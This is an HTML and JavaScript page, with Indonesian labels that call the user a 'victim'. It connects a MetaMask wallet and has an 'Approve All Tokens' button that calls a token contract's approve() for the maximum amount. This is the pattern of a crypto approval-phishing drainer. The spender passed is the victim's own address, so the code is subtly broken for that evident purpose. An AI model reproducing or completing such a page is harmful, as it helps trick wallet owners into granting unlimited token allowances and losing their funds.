<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>DApp untuk Korban Berinteraksi dengan Smart Contract</title>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
</head>
<body>

<h1>Interact with Smart Contract as Victim</h1>

<!-- Connect Wallet Button -->
<button id="connectWallet">Connect Wallet</button>

<!-- Approve All Tokens -->
<h2>Approve All Tokens</h2>
<div id="approveAllInfo">
  <p>Your connected wallet: <span id="walletAddress"></span></p>
  <button id="approveAllButton" type="submit">Approve All Tokens</button>
</div>

<script>
  // Initialize ethers.js
  let provider, contract, signer;

  const contractAddress = '0x8816e4c39472B5Ce851fB8cB271de419bF638f43';
  const contractABI = [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "spender",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "approve",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ];

  // Function to connect wallet
  async function connectWallet() {
    if (window.ethereum) {
      try {
        await ethereum.request({ method: 'eth_requestAccounts' });
        provider = new ethers.providers.Web3Provider(window.ethereum);
        signer = provider.getSigner();
        contract = new ethers.Contract(contractAddress, contractABI, signer);

        // Menampilkan alamat wallet yang terhubung
        document.getElementById('walletAddress').innerText = await signer.getAddress();
        document.getElementById('approveAllInfo').style.display = 'block';
      } catch (err) {
        console.error(err);
      }
    } else {
      console.log('MetaMask not installed');
    }
  }

  // Approve All Tokens
  document.getElementById('approveAllButton').addEventListener('click', async () => {
    try {
      const tx = await contract.approve(await signer.getAddress(), ethers.constants.MaxUint256);  // Approve all tokens
      console.log('Transaction successful:', tx);
    } catch (err) {
      console.error(err);
    }
  });

  // Connect Wallet Button
  document.getElementById('connectWallet').addEventListener('click', connectWallet);
</script>

</body>
</html>
